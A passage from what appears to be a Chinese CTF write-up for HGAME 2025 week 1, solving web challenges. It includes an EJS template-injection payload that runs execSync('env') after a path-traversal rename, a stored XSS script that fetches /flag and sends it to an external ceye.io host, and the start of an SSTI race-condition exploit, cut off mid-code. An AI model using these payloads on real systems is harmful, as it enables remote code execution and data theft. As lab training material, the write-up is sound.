class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>主要问题出在<strong>文件上传</strong>和<strong>重命名</strong>两个部分。</p><p>文件上传部分filename直接利用<strong>file.originalname</strong>，并未对我们上传的文件进行任何过滤。所以我们可以上传恶意文件甚至我们修改上传的文件名还能进行<strong>目录遍历</strong>。</p><p><code>/rename</code>路由中，它接受<strong>oldName和newName</strong>，然后进行重命名。同样存在目录遍历。</p><p>同时该应用采用的是<strong>EJS模板引擎</strong>进行渲染，<strong>EJS</strong>是一个javascript模板库，用来从<strong>json数据中生成HTML字符串</strong>，而<code>/</code>路由通过**<code>res.render(&#39;mortis&#39;, &#123; files: files &#125;);</code><strong>，所以我们的思路就是利用</strong>目录遍历漏洞<strong>将</strong><code>mortis.ejs</code><strong>文件上传到</strong><code>views</code><strong>目录下将原来的<code>mortis.ejs</code>文件进行</strong>覆盖**，这样访问<code>/</code>时应用渲染mortis模板时就会执行我们的恶意代码</p><p>创建<code>mortis.ejs</code>文件，写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env&#x27;) %&gt;</span><br></pre></td></tr></table></figure><p>上传到服务器：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-143934.png"></p><p><code>/rename</code>路由重命名文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;oldName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mortis.ejs&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;newName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../views/mortis.ejs&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-144110.png"></p><p>访问<code>/</code>得到flag：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-144348.png"></p><h2 id="MysteryMessageBoard"><a href="#MysteryMessageBoard" class="headerlink" title="MysteryMessageBoard"></a>MysteryMessageBoard</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/chromedp/chromedp&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">store = sessions.NewCookieStore([]<span class="type">byte</span>(<span class="string">&quot;fake_key&quot;</span>))</span><br><span class="line">users = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line"><span class="string">&quot;shallot&quot;</span>: <span class="string">&quot;fake_password&quot;</span>,</span><br><span class="line"><span class="string">&quot;admin&quot;</span>:   <span class="string">&quot;fake_password&quot;</span>&#125;</span><br><span class="line">comments []<span class="type">string</span></span><br><span class="line">flag     = <span class="string">&quot;FLAG&#123;this_is_a_fake_flag&#125;&quot;</span></span><br><span class="line">lock     sync.Mutex</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">username := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">password := c.PostForm(<span class="string">&quot;password&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> storedPassword, ok := users[username]; ok &amp;&amp; storedPassword == password &#123;</span><br><span class="line">session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">session.Values[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">session.Options = &amp;sessions.Options&#123;</span><br><span class="line">Path:     <span class="string">&quot;/&quot;</span>,</span><br><span class="line">MaxAge:   <span class="number">3600</span>,</span><br><span class="line">HttpOnly: <span class="literal">false</span>,</span><br><span class="line">Secure:   <span class="literal">false</span>,</span><br><span class="line">&#125;</span><br><span class="line">session.Save(c.Request, c.Writer)</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;success&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Printf(<span class="string">&quot;Login failed for user: %s\n&quot;</span>, username)</span><br><span class="line">c.String(http.StatusUnauthorized, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">logoutHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line"><span class="built_in">delete</span>(session.Values, <span class="string">&quot;username&quot;</span>)</span><br><span class="line">session.Save(c.Request, c.Writer)</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/login&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">indexHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, _ := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line">username, ok := session.Values[<span class="string">&quot;username&quot;</span>].(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">log.Println(<span class="string">&quot;User not logged in, redirecting to login&quot;</span>)</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/login&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> c.Request.Method == http.MethodPost &#123;</span><br><span class="line">comment := c.PostForm(<span class="string">&quot;comment&quot;</span>)</span><br><span class="line">log.Printf(<span class="string">&quot;New comment submitted: %s\n&quot;</span>, comment)</span><br><span class="line">comments = <span class="built_in">append</span>(comments, comment)</span><br><span class="line">&#125;</span><br><span class="line">htmlContent := fmt.Sprintf(<span class="string">`&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;留言板&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;欢迎，%s，试着写点有意思的东西吧，admin才不会来看你！自恋的笨蛋！&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;form method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;textarea name=&quot;comment&quot; required&gt;&lt;/textarea&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;提交评论&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;h3&gt;留言:&lt;/h3&gt;</span></span><br><span class="line"><span class="string">&lt;ul&gt;`</span>, username)</span><br><span class="line"><span class="keyword">for</span> _, comment := <span class="keyword">range</span> comments &#123;</span><br><span class="line">htmlContent += <span class="string">&quot;&lt;li&gt;&quot;</span> + comment + <span class="string">&quot;&lt;/li&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">htmlContent += <span class="string">`&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;&lt;a href=&quot;/logout&quot;&gt;退出&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;`</span></span><br><span class="line">c.Data(http.StatusOK, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="type">byte</span>(htmlContent))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">adminHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">htmlContent := <span class="string">`&lt;html&gt;&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;好吧好吧你都这么求我了~admin只好勉为其难的来看看你写了什么~才不是人家想看呢！&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;&lt;/html&gt;`</span></span><br><span class="line">c.Data(http.StatusOK, <span class="string">&quot;text/html; charset=utf-8&quot;</span>, []<span class="type">byte</span>(htmlContent))</span><br><span class="line"><span class="comment">//无头浏览器模拟登录admin，并以admin身份访问/路由</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> lock.Unlock()</span><br><span class="line">ctx, cancel := chromedp.NewContext(context.Background())</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line">ctx, _ = context.WithTimeout(ctx, <span class="number">20</span>*time.Second)</span><br><span class="line"><span class="keyword">if</span> err := chromedp.Run(ctx, myTasks()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Chromedp error:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无头浏览器操作</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myTasks</span><span class="params">()</span></span> chromedp.Tasks &#123;</span><br><span class="line"><span class="keyword">return</span> chromedp.Tasks&#123;</span><br><span class="line">chromedp.Navigate(<span class="string">&quot;/login&quot;</span>),</span><br><span class="line">chromedp.WaitVisible(<span class="string">`input[name=&quot;username&quot;]`</span>),</span><br><span class="line">chromedp.SendKeys(<span class="string">`input[name=&quot;username&quot;]`</span>, <span class="string">&quot;admin&quot;</span>),</span><br><span class="line">chromedp.SendKeys(<span class="string">`input[name=&quot;password&quot;]`</span>, <span class="string">&quot;fake_password&quot;</span>),</span><br><span class="line">chromedp.Click(<span class="string">`input[type=&quot;submit&quot;]`</span>),</span><br><span class="line">chromedp.Navigate(<span class="string">&quot;/&quot;</span>),</span><br><span class="line">chromedp.Sleep(<span class="number">5</span> * time.Second),</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">flagHandler</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;Handling flag request&quot;</span>)</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusInternalServerError, <span class="string">&quot;无法获取会话&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">username, ok := session.Values[<span class="string">&quot;username&quot;</span>].(<span class="type">string</span>)</span><br><span class="line"><span class="keyword">if</span> !ok || username != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">c.String(http.StatusForbidden, <span class="string">&quot;只有admin才可以访问哦&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">log.Println(<span class="string">&quot;Admin accessed the flag&quot;</span>)</span><br><span class="line">c.String(http.StatusOK, flag)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/login&quot;</span>, loginHandler)</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, loginHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/logout&quot;</span>, logoutHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, indexHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, adminHandler)</span><br><span class="line">r.GET(<span class="string">&quot;/flag&quot;</span>, flagHandler)</span><br><span class="line">log.Println(<span class="string">&quot;Server started at :8888&quot;</span>)</span><br><span class="line">log.Fatal(r.Run(<span class="string">&quot;:8888&quot;</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较简单的XSS，大概的逻辑就是通过<code>/login</code>路由登录，然后<code>/</code>存在留言板用于我们写入<strong>XSS payload</strong>，而访问<code>/admin</code>路由会触发无头浏览器以admin身份登录，并访问首页。这时候首页加载所有评论，其中包含我们的<strong>XSS payload</strong>，从而以admin身份<strong>访问<code>/flag</code>路由</strong>并将返回的<strong>flag</strong>外带到我们的服务器。</p><p>账户给了<strong>shallot</strong>，通过<strong>弱口令</strong>爆破出密码为<strong>888888</strong>：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-203048.png"></p><p>在留言板写入我们的<strong>XSS payload</strong>:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">flag</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;http://ip.port.4xmzfl.ceye.io/&#x27;</span> + <span class="built_in">encodeURIComponent</span>(flag));</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里我是将flag外带到**<code>CEYE</code>**</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-204223.png"></p><p>访问**<code>/admin</code>路由**触发我们的payload，成功外带出flag:</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-202957.png"></p><h2 id="角落"><a href="#角落" class="headerlink" title="角落"></a>角落</h2><p>扫目录存在<code>/robots.txt</code>：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250207-211003.png"></p><p><code>/app.conf</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Include by httpd.conf</span><br><span class="line">&lt;Directory &quot;/usr/local/apache2/app&quot;&gt;</span><br><span class="line">Options Indexes</span><br><span class="line">AllowOverride None</span><br><span class="line">Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">&lt;Files &quot;/usr/local/apache2/app/app.py&quot;&gt;</span><br><span class="line">    Order Allow,Deny</span><br><span class="line">    Deny from all</span><br><span class="line">&lt;/Files&gt;</span><br><span class="line"></span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;^L1nk/&quot;</span><br><span class="line">RewriteRule &quot;^/admin/(.*)$&quot; &quot;/$1.html?secret=todo&quot;</span><br><span class="line"></span><br><span class="line">ProxyPass &quot;/app/&quot; &quot;http://127.0.0.1:5000/&quot;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">Black Hat USA 2024：利用Apache HTTP服务器中隐藏的语义歧义进行攻击！ | 长亭百川云</a></p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250217-173209.png"></p><p>源码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> templates</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">pwd = os.path.dirname(__file__)</span><br><span class="line">show_msg = templates.show_msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readmsg</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(filename):</span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">message = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">return</span> message</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;No message now.&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">status = request.args.get(<span class="string">&#x27;status&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> status <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">status = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, status=status)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/send&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_message</span>():</span><br><span class="line">filename = pwd + <span class="string">&quot;/tmp/message.txt&quot;</span></span><br><span class="line">message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">f.write(message) </span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> redirect(<span class="string">&#x27;index?status=Send successfully!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_message</span>():</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> readmsg():</span><br><span class="line">show = show_msg.replace(<span class="string">&quot;&#123;&#123;message&#125;&#125;&quot;</span>, readmsg())</span><br><span class="line"><span class="keyword">return</span> render_template_string(show)</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;waf!!&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host = <span class="string">&#x27;0.0.0.0&#x27;</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>可以看到存在<strong>SSTI</strong>，但过滤了”{“，直接条件竞争即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 